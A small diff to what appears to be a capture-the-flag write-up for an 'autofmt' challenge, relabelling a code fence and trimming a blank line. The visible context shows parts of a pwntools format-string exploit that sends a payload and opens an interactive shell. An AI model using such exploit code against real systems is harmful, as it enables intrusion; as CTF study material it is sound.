@@ -4,7 +4,7 @@
 ---
 
 
-```
+```js
 from pwn import *
 
 #p = process('./autofmt')
@@ -25,7 +25,6 @@ payload = fmtstr.fmtstr_payload(10, writes, write_size='short')
 
 p.sendline(payload)
 p.interactive()
-
 ```
 
 ![flag](images/flag.png)
